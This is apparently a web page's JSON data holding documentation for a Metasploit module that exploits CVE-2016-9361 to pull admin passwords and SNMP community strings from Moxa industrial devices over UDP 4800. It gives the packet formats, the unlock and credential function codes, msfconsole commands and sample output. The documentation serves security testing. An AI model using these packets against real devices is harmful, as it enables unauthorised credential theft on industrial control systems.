{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/auxiliary/admin/scada/moxa_credentials_recovery","result":{"data":{"moduleMetadataJson":{"id":"2ef2a670-15af-5442-8ef5-d6f45349498f","name":"Moxa Device Credential Retrieval","fullname":"auxiliary/admin/scada/moxa_credentials_recovery","description":"The Moxa protocol listens on 4800/UDP and will respond to broadcast\n        or direct traffic.  The service is known to be used on Moxa devices\n        in the NPort, OnCell, and MGate product lines.  Many devices with\n        firmware versions older than 2017 or late 2016 allow admin credentials\n        and SNMP read and read/write community strings to be retrieved without\n        authentication.\n\n        This module is the work of Patrick DeSantis of Cisco Talos and K. Reid\n        Wightman.\n\n        Tested on: Moxa NPort 6250 firmware v1.13, MGate MB3170 firmware 2.5,\n        and NPort 5110 firmware 2.6.","rank":300,"fields":{"detailsSlug":"/modules/details/auxiliary/admin/scada/moxa_credentials_recovery","documentationSlug":"/modules/documentation/auxiliary/admin/scada/moxa_credentials_recovery"},"documentation":{"html":"<h2 id=\"vulnerable-application\" style=\"position:relative;\"><a href=\"#vulnerable-application\" aria-label=\"vulnerable application permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Vulnerable Application</h2>\n<p>  Many Moxa devices make use of a protocol that is vulnerable to unauthenticated credential retrieval via exploitation of CVE-2016-9361.  The service is known\nto be used on Moxa devices in the NPort, OnCell, and MGate product lines.</p>\n<p>  This module leverages CVE-2016-9361 to retrieve admin passwords and SNMP\ncommunity strings, as well as enumerate all possible function codes.  The supporting research and Metasploit module are the work of Patrick DeSantis\nof Cisco Talos and K. Reid Wightman.</p>\n<p>  The module has been tested on Moxa NPort 6250 firmware v1.13, MGate MB3170\nfirmware v2.5, and NPort 5110 firmware v2.6.</p>\n<h3 id=\"the-moxa-protocol\" style=\"position:relative;\"><a href=\"#the-moxa-protocol\" aria-label=\"the moxa protocol permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>The Moxa Protocol</h3>\n<p>  The Moxa protocol listens on 4800/UDP and will respond to broadcast or direct traffic.  The protocol is utilized by devices in several product lines and\nMoxa applications in order to manage and configure network-deployed devices.</p>\n<h4 id=\"discovery--identify\" style=\"position:relative;\"><a href=\"#discovery--identify\" aria-label=\"discovery  identify permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Discovery / Identify</h4>\n<p>  A discovery packet compels a Moxa device to respond to the sender with some\nbasic device information that is needed for more advanced functions.  The\ndiscovery data is 8 bytes in length and is the most basic example of the Moxa protocol.  It may be sent out as a broadcast (destination 255.255.255.255) or\nto an individual device.</p>\n<p>  The discovery request contains the bytes:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  \\x01\\x00\\x00\\x08\\x00\\x00\\x00\\x00</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  Where the function code (first byte) 0x01 is Moxa discovery/identify\nand the fourth byte is the length of the full data payload.</p>\n<h5 id=\"discovery-response\" style=\"position:relative;\"><a href=\"#discovery-response\" aria-label=\"discovery response permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Discovery Response</h5>\n<p>  A valid response is 24 bytes, starts with 0x81, and contains the values\n0x00, 0x90, 0xe8 (the Moxa OIU) in bytes 14, 15, and 16.</p>\n<p>  A response with a value of 0x04 for the second byte indicates that an invalid\nfunction code was used in the corresponding request.</p>\n<p>  The response can be broken down as follows:</p>\n<ul>\n<li>Byte 0x0 identifies the packet as a response to the request. The first byte of a response will always be the FC + 0x80 (the most significant bit of the byte is set to 1, so 0b00000001 becomes 0b10000001, or 0x81 as response to identify 0x01).</li>\n<li>Bytes 0x1-0x2 are unknown, may be padding</li>\n<li>Byte 0x3 is the length of the datagram payload</li>\n<li>Bytes 0x4-0x7 are unknown, may be padding</li>\n<li>Bytes 0x8-0x9 may be the product line in little endian.  For example, an NPort 6250 is part of the 6000 line, so bytes 8 and 9 will be 0x00 and 0x60 respectively.</li>\n<li>Bytes 0xA-0xB are unknown but always seem to be 0x00 and 0x80 respectively.</li>\n<li>Bytes 0xC-0xD are the model number in little endian, so the NPort 6250 is 0x50 and 0x62 respectively.</li>\n<li>Bytes 0xE-0x13 are the MAC address of the device</li>\n<li>Bytes 0x14-0x17 are the IP address</li>\n</ul>\n<p>  Here's a sample response from an NPort 6250 with the default IP address of 192.168.127.254 and a MAC of 00:90:e8:15:1c:22:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  0000  81  00  00  18  00  00  00  00  00  60  00  80  50  62  00  90\n  0010  e8  15  1c  22  c0  a8  7f  fe\t \t \t \t \t \t \t \t \n\n  Model:  0x50 0x60 = 6250\n  MAC:  00:90:e8:15:1c:22\n  IP: c0:a8:7f:fe = 192.168.127.254</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h4 id=\"other-functions\" style=\"position:relative;\"><a href=\"#other-functions\" aria-label=\"other functions permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Functions</h4>\n<p>  The values from the response are then used to craft a new request with the below format:</p>\n<ul>\n<li>Byte 0x0 is the function code</li>\n<li>Bytes 0x1-0x2 are unknown, may be padding</li>\n<li>Byte 0x3 is the length of the datagram payload</li>\n<li>Bytes 0x4-0x7 are unknown, may be padding</li>\n<li>Bytes 0x8-0x9 are the product line in little endian</li>\n<li>Bytes 0xA-0xB are the unknown 0x00 0x80</li>\n<li>Bytes 0xC-0xD is the model number in big endian</li>\n<li>Bytes 0xE-0x13 is the MAC</li>\n</ul>\n<p>  The module takes a valid response from discovery/ident and parses out the appropriate bytes to use as a \"tail\" which is appended to all subsequent requests.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  tail = response[8..24]</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  The tail is then used as shown below:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  datagram = fc[func] + &quot;\\x00\\x00\\x14\\x00\\x00\\x00\\x00&quot; + tail</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<p>  For all function codes other than identify (0x01), as long as the \"tail\" values in the request match those of the target, the device will execute the function defined by the value in byte 0x0.</p>\n<h5 id=\"other-known-and-suspected-function-codes\" style=\"position:relative;\"><a href=\"#other-known-and-suspected-function-codes\" aria-label=\"other known and suspected function codes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Other Known and Suspected Function Codes</h5>\n<p>  Function codes fall in the range of 0x01 to 0x7F.</p>\n<p>  The below function codes are included in the module, even if unused.  The intent is that the user may modify the module as needed to make use of other function codes.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">  &#39;ident&#39;         =&gt;  &quot;\\x01&quot;,   # identify device\n  &#39;name&#39;          =&gt;  &quot;\\x10&quot;,   # get the &quot;server name&quot; of the device\n  &#39;netstat&#39;       =&gt;  &quot;\\x14&quot;,   # network activity of the device\n  &#39;unlock1&#39;       =&gt;  &quot;\\x16&quot;,   # &quot;unlock&quot; some devices, including 5110, MGate\n  &#39;date_time&#39;     =&gt;  &quot;\\x1a&quot;,   # get the device date and time\n  &#39;time_server&#39;   =&gt;  &quot;\\x1b&quot;,   # get the time server of device\n  &#39;unlock2&#39;       =&gt;  &quot;\\x1e&quot;,   # &quot;unlock&quot; 6xxx series devices\n  &#39;snmp_read&#39;     =&gt;  &quot;\\x28&quot;,   # snmp community strings\n  &#39;pass&#39;          =&gt;  &quot;\\x29&quot;,   # admin password of some devices\n  &#39;all_creds&#39;     =&gt;  &quot;\\x2c&quot;,   # snmp comm strings and admin password of 6xxx</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"verification-steps\" style=\"position:relative;\"><a href=\"#verification-steps\" aria-label=\"verification steps permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Verification Steps</h2>\n<ol>\n<li>Start msfconsole</li>\n<li>Do: <code class=\"language-text\">use auxiliary/admin/scada/moxa_credentials_recovery</code></li>\n<li>Do: <code class=\"language-text\">set RHOST &lt;target IP&gt;</code></li>\n<li>Do: <code class=\"language-text\">run</code></li>\n<li>Any found credentials will be stored in loot (set VERBOSE to TRUE to have credentials output to console)</li>\n</ol>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p>  <strong>RHOST</strong></p>\n<p>  Target device.</p>\n<p>  <strong>FUNCTION</strong></p>\n<p>  Either CREDS (default) or ENUM:</p>\n<ul>\n<li>CREDS attempts to retrieve administrative password and SNMP community strings</li>\n<li>ENUM will enumerate all function codes in the range 0x2..0x7F</li>\n</ul>\n<h2 id=\"scenarios\" style=\"position:relative;\"><a href=\"#scenarios\" aria-label=\"scenarios permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Scenarios</h2>\n<h3 id=\"check\" style=\"position:relative;\"><a href=\"#check\" aria-label=\"check permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Check</h3>\n<p>  The module implements a check function to determine if a target \"speaks\" the Moxa protocol.  It does this using the 0x01 function code and checking for a valid response of 24 bytes, starting with 0x81, and containing the values 0x00, 0x90, 0xe8 (the Moxa OIU) in bytes 14, 15, and 16.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">if response[0] == &quot;\\x81&quot; &amp;&amp; response[14..16] == &quot;\\x00\\x90\\xe8&quot; &amp;&amp; response.length == 24</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span></span></pre></div>\n<h3 id=\"output-hexdump-to-console\" style=\"position:relative;\"><a href=\"#output-hexdump-to-console\" aria-label=\"output hexdump to console permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Output Hexdump to Console</h3>\n<p>  To output hexdump responses to console:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/admin/scada/moxa_credentials_recovery\nmsf auxiliary(moxa_credentials_recovery) &gt; set RHOST &lt;target IP&gt;\nmsf auxiliary(moxa_credentials_recovery) &gt; set VERBOSE TRUE\nmsf auxiliary(moxa_credentials_recovery) &gt; run</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Sample verbose output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">... SNIP...\n[*] Response:\n90 00 00 3c 00 00 00 00 00 60 00 80 50 62 00 90    |...&lt;.....`..Pb..|\ne8 15 1c 22 4e 50 36 32 35 30 5f 35 38 39 36 00    |...&quot;NP6250_5896.|\n10 00 11 00 12 00 13 00 14 00 15 00 16 00 17 00    |................|\n18 00 19 00 1a 00 1b 00 1c 00 1d 00                |............|\n... SNIP ...\n\n[*] snmp community retrieved: public_admin\n[*] snmp read/write community retrieved: private_admin\n[*] password retrieved: secretpassword\n... SNIP ...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<h3 id=\"enumerate-all-function-codes\" style=\"position:relative;\"><a href=\"#enumerate-all-function-codes\" aria-label=\"enumerate all function codes permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Enumerate All Function Codes</h3>\n<p>  To enumerate ALL function codes :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf &gt; use auxiliary/admin/scada/moxa_credentials_recovery\nmsf auxiliary(moxa_credentials_recovery) &gt; set RHOST &lt;target IP&gt;\nmsf auxiliary(moxa_credentials_recovery) &gt; set FUNCTION ENUM\nmsf auxiliary(moxa_credentials_recovery) &gt; run</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Sample ENUM output:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">... SNIP...\n[*] Function Code: 14    |.|\n\n\n[*] Response:\n94 00 01 08 00 00 00 00 00 60 00 80 50 62 00 90    |.........`..Pb..|\ne8 15 1c 22 0f 00 00 00 00 00 00 00 00 00 00 00    |...&quot;............|\n00 00 00 00 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|\n00 00 c0 12 00 00 ff 00 00 00 00 00 00 00 00 00    |................|\n00 00 a1 00 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|\n00 00 89 00 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|\n00 00 24 13 01 01 ff 00 00 00 00 00 00 00 00 00    |..$.............|\n00 00 b5 03 00 00 00 00 00 00 00 00 c0 a8 7f fe    |................|\n00 00 34 3a 01 01 00 00 00 00 00 00 c0 a8 7f fe    |..4:............|\n00 00 17 00 01 01 00 00 00 00 00 00 c0 a8 7f fe    |................|               \n... SNIP ...</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>  Note that the above response is an example of the utility of using ENUM.  This function code (0x14) returns a netstat-type response.  Output similar to the above will be displayed for every function code that does not return 'invalid' (0x4).  This may also be useful for devices that do not \"unlock\" using the function codes supplied in this module; by running through all function codes in sequence, it is likely that an alternate \"unlock\" function will be sent prior to any function codes that request credentials.</p>\n<p>  NOTE: As the protocol is undocumented and the purpose of a majority of the function codes are unknown, undesired results are possible.  Do NOT use on devices which are mission-critical!</p>"}}},"pageContext":{"id":"2ef2a670-15af-5442-8ef5-d6f45349498f"}}}